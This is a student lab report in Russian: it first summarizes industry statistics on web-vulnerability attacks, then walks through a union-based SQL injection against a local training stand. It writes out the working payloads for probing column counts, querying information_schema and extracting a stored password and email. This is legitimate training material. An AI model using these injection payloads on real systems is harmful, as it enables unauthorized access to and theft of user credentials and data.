# лабораторная работа 1

халибеков алан
бивт 24 9

## часть 1

в этой части я посмотрел несколько отчетов по атакам через веб уязвимости
сразу видно что проценты в источниках отличаются потому что в одном случае считают только подтвержденные breaches в другом берут incident response кейсы а в третьем берут телеметрию waf
поэтому я просто указываю scope и цифры как они даны в источниках

### доля атак через веб уязвимости

1. verizon dbir 2025
   exploitation of vulnerabilities как initial access встречается в 20 процентов breaches
   внутри exploitation кейсов на web application приходится 42 процента

2. verizon dbir 2024
   exploitation of vulnerabilities как initial entry было в 14 процентах breaches
   при этом в basic web application attacks внутри паттерна exploit vulnerabilities дает 13 процентов а основная часть там это stolen credentials и brute force

3. mandiant m trends 2025
   в 33 процентах intrusions начальный вектор это exploitation of a vulnerability
   отдельно exploit public facing application идет на уровне 22.2 процента среди initial access техник

4. microsoft digital defense report 2025
   18 процентов breaches начинались через unpatched web assets
   exploit public facing application отдельно указан на уровне 11 процентов

5. kaspersky incident response report for 2024
   public facing applications как initial attack vector дали 39.2 процента

6. positive technologies по расследованиям 2023 2024
   веб приложения на сетевом периметре дали 44 процента как исходный вектор проникновения

если собрать это вместе то получается так
если смотреть на большие breach отчеты то цифры чаще всего примерно 14 20 процентов
если смотреть на incident response и расследования то веб вектор обычно выше примерно 18 44 процента

### распределение по конкретным уязвимостям

по конкретным типам веб уязвимостей картина тоже зависит от источника
waf показывает поток атакующего трафика а pentest показывает найденные слабые места
но общая картина все равно понятная

1. solar waf 2024
   sql injection 6 процентов
   xss 4 процента
   path traversal 3 процента

2. akamai api threats
   sqli 14.1 процента
   xss 8.2 процента
   ssrf 7.4 процента
   cmdi 7.1 процента

3. cloudflare api security
   injection attack sqli xss и похожие 26.3 процента
   отдельно в детализации sqli 34.5 процента command injection 14.3 процента xss 7.3 процента

4. solar jsoc по веб приложениям
   раскрытие отладочной и конфигурационной информации 70 процентов
   недостатки контроля доступа 60 процентов
   xss 38 процентов

### вывод по первой части

веб уязвимости остаются одним из основных способов начального доступа в организации
особенно это хорошо видно в incident response отчетах
среди конкретных проблем чаще всего встречаются разные инъекции xss ошибки контроля доступа раскрытие конфигурации и старые уязвимые компоненты

## часть 2

после запуска стенда я пошел по самому простому пути сначала посмотрел что дает обычный параметр id потом проверил sql ошибку потом подобрал число колонок и дальше уже полез в information_schema

### запуск

```bash
docker-compose up -d
```

после этого открыл localhost 8080
потом нажал установить или сбросить базу и перешел к заданию

### ход работы и все запросы

1. сначала я открыл обычную страницу с id

```text
http://localhost:8080/task/?id=1
```

ответ был такой

```text
ваш id 1
ваш логин admin
```

2. потом я перебрал id чтобы понять какие вообще есть пользователи

```bash
for i in $(seq 0 100)
do
  echo "ID: $i"
  curl -s "http://localhost:8080/task/?id=$i"
  echo
 done
```

по результатам получилось так

```text
1 admin
2 volk
3 matroskin
4 vinni-pukh
5 neznaika
6 kotenok
7 karlson
8 kesha
9 volk2
```

из этого сразу видно что vinni-pukh это id 4 а volk2 это id 9

3. дальше я проверил sql инъекцию обычной кавычкой

```text
http://localhost:8080/task/?id=1'
```

приложение вернуло sql ошибку

```text
you have an error in your sql syntax
check the manual that corresponds to your mysql server version for the right syntax
to use near ''1'' limit 0 1 at line 1
```

значит инъекция есть и база похожа на mysql

4. потом я стал подбирать число колонок для union select

```text
http://localhost:8080/task/?id=0'+UNION+SELECT+1,2--+-
http://localhost:8080/task/?id=0'+UNION+SELECT+1,2,3--+-
```

с двумя колонками была ошибка
с тремя колонками запрос прошел
значит в union select нужно 3 значения

5. потом я получил список таблиц базы

```text
http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(table_name+SEPARATOR+','),3+FROM+information_schema.tables+WHERE+table_schema=database()--+-
```

результат

```text
emails users
```

6. после этого я посмотрел колонки в таблице users

```text
http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(column_name+SEPARATOR+','),3+FROM+information_schema.columns+WHERE+table_name='users'--+-
```

результат

```text
id username password
```

7. потом посмотрел колонки в таблице emails

```text
http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(column_name+SEPARATOR+','),3+FROM+information_schema.columns+WHERE+table_name='emails'--+-
```

результат

```text
id email_id
```

8. потом вытащил пароль пользователя volk2

```text
http://localhost:8080/task/?id=0'+UNION+SELECT+1,password,3+FROM+users+WHERE+id=9--+-
```

результат

```text
Wa spoiuuuuu
```

9. потом вытащил почту пользователя vinni-pukh

```text
http://localhost:8080/task/?id=0'+UNION+SELECT+1,email_id,3+FROM+emails+WHERE+id=4--+-
```

результат

```text
honey_lover@otus-lab.com
```

## итоговые ответы

1. пароль пользователя volk2

```text
Wa spoiuuuuu
```

2. почта пользователя vinni-pukh

```text
honey_lover@otus-lab.com
```

## общий вывод

в первой части я посмотрел статистику по отчетам и увидел что веб уязвимости до сих пор остаются одним из самых частых способов входа в компанию
во второй части на учебном стенде получилось через union based sql injection сначала получить структуру базы а потом достать нужные данные

## источники

1. https://www.verizon.com/business/resources/reports/2024/2024-dbir-data-breach-investigations-report.pdf
2. https://www.verizon.com/business/r3s0u4c3s/vps/vps-2025-dbir.pdf
3. https://services.google.com/fh/files/misc/m-trends-2025-en.pdf
4. https://www.microsoft.com/en-us/corporate-responsibility/cybersecurity/microsoft-digital-defense-report-2025/
5. https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/msc/documents/presentations/CSR/Microsoft-Digital-Defense-Report-2025.pdf
6. https://securelist.com/kaspersky-incident-response-report-2024/115873/
7. https://www.kaspersky.com/about/press-releases/valid-accounts-showed-significant-increase-as-initial-attack-vector-in-2024
8. https://ptsecurity.com/research/analytics
9. https://www.ptsecurity.com/ru-ru/research/analytics/
10. https://rt-solar.ru/analytics/web-attacks-russian-companies-2024/
11. https://rt-solar.ru/analytics/key-vulnerabilities-2024/
12. https://www.akamai.com/state-of-the-internet/api-security-threats
13. https://www.cloudflare.com/application-security/
